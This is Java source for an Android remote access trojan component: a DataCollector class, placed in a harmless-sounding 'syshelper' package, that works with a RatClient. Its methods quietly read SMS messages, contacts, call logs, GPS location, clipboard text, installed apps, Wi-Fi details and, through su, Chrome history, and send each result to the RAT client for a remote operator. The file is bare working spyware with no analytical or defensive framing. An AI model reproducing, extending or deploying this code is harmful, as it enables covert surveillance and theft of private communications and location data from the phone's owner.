package com.syshelper.service;
import android.content.Context;
import android.content.pm.PackageManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;

public class DataCollector {
    private final Context ctx;
    private final RatClient client;

    public DataCollector(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    private boolean hasPermission(String perm) {
        return ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED;
    }

    public void dumpSms() {
        new Thread(() -> {
            if (!hasPermission(android.Manifest.permission.READ_SMS)) { client.sendResult("sms_dump", "no permission"); return; }
            try {
                android.database.Cursor c = ctx.getContentResolver().query(Telephony.Sms.CONTENT_URI, new String[]{"address","date","body","type"}, null, null, "date DESC LIMIT 500");
                JSONArray arr = new JSONArray();
                while (c != null && c.moveToNext()) {
                    JSONObject s = new JSONObject();
                    s.put("number", c.getString(0)); s.put("date", c.getString(1));
                    s.put("body", c.getString(2)); s.put("type", c.getInt(3) == 1 ? "in" : "out");
                    arr.put(s);
                }
                if (c != null) c.close();
                client.sendResult("sms_dump", arr);
            } catch (Exception e) { client.sendResult("sms_dump", "Error: " + e.getMessage()); }
        }).start();
    }

    public void dumpContacts() {
        new Thread(() -> {
            if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) { client.sendResult("contacts_dump", "no permission"); return; }
            try {
                android.database.Cursor c = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"display_name","number"}, null, null, null);
                JSONArray arr = new JSONArray();
                while (c != null && c.moveToNext()) {
                    JSONObject s = new JSONObject();
                    s.put("name", c.getString(0)); s.put("number", c.getString(1));
                    arr.put(s);
                }
                if (c != null) c.close();
                client.sendResult("contacts_dump", arr);
            } catch (Exception e) { client.sendResult("contacts_dump", "Error: " + e.getMessage()); }
        }).start();
    }

    public void dumpCallLog() {
        new Thread(() -> {
            if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) { client.sendResult("call_log", "no permission"); return; }
            try {
                android.database.Cursor c = ctx.getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{"number","date","duration","type"}, null, null, "date DESC LIMIT 200");
                JSONArray arr = new JSONArray();
                while (c != null && c.moveToNext()) {
                    JSONObject s = new JSONObject();
                    s.put("number", c.getString(0)); s.put("date", c.getString(1));
                    s.put("duration", c.getString(2)); s.put("type", c.getInt(3));
                    arr.put(s);
                }
                if (c != null) c.close();
                client.sendResult("call_log", arr);
            } catch (Exception e) { client.sendResult("call_log", "Error: " + e.getMessage()); }
        }).start();
    }

    public void getLocation() {
        new Thread(() -> {
            if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) { client.sendResult("location", "no permission"); return; }
            try {
                android.location.LocationManager lm = (android.location.LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                android.location.Location loc = lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    JSONObject j = new JSONObject();
                    j.put("lat", loc.getLatitude()); j.put("lng", loc.getLongitude()); j.put("accuracy", loc.getAccuracy());
                    client.sendResult("location", j);
                } else { client.sendResult("location", "no location"); }
            } catch (Exception e) { client.sendResult("location", "Error: " + e.getMessage()); }
        }).start();
    }

    public void getClipboard() {
        new Thread(() -> {
            try {
                android.content.ClipboardManager cm = (android.content.ClipboardManager) ctx.getSystemService(Context.CLIPBOARD_SERVICE);
                String text = cm != null && cm.hasPrimaryClip() ? cm.getPrimaryClip().getItemAt(0).coerceToText(ctx).toString() : "";
                client.sendResult("clipboard", text);
            } catch (Exception e) { client.sendResult("clipboard", "Error: " + e.getMessage()); }
        }).start();
    }

    public void vibrate() {
        new Thread(() -> {
            try {
                android.os.Vibrator v = (android.os.Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) v.vibrate(500);
                client.sendResult("vibrate", "ok");
            } catch (Exception e) { client.sendResult("vibrate", "Error: " + e.getMessage()); }
        }).start();
    }

    public void listApps() {
        new Thread(() -> {
            try {
                java.util.List<android.content.pm.PackageInfo> packs = ctx.getPackageManager().getInstalledPackages(0);
                JSONArray arr = new JSONArray();
                for (android.content.pm.PackageInfo p : packs) {
                    JSONObject a = new JSONObject();
                    a.put("name", p.applicationInfo.loadLabel(ctx.getPackageManager()).toString());
                    a.put("package", p.packageName);
                    a.put("system", (p.applicationInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
                    arr.put(a);
                }
                client.sendResult("apps", arr);
            } catch (Exception e) { client.sendResult("apps", "Error: " + e.getMessage()); }
        }).start();
    }

    public void dumpBrowser(String browser) {
        new Thread(() -> {
            try {
                String dbPath = "/data/data/com.android.chrome/app_chrome/Default/History";
                Process p = Runtime.getRuntime().exec(new String[]{"su", "-c", "cat " + dbPath});
                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line);
                p.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
                client.sendResult("browser_dump", sb.length() > 0 ? "dumped " + sb.length() + " bytes" : "no root");
            } catch (Exception e) { client.sendResult("browser_dump", "Error: " + e.getMessage()); }
        }).start();
    }

    public void dumpWifi() {
        new Thread(() -> {
            try {
                WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                WifiInfo info = wm.getConnectionInfo();
                JSONObject j = new JSONObject();
                j.put("ssid", info.getSSID()); j.put("bssid", info.getBSSID());
                j.put("rssi", info.getRssi()); j.put("ip", intToIp(info.getIpAddress()));
                client.sendResult("wifi_dump", j);
            } catch (Exception e) { client.sendResult("wifi_dump", "Error: " + e.getMessage()); }
        }).start();
    }

    private String intToIp(int i) {
        return (i & 0xFF) + "." + ((i >> 8) & 0xFF) + "." + ((i >> 16) & 0xFF) + "." + ((i >> 24) & 0xFF);
    }
}
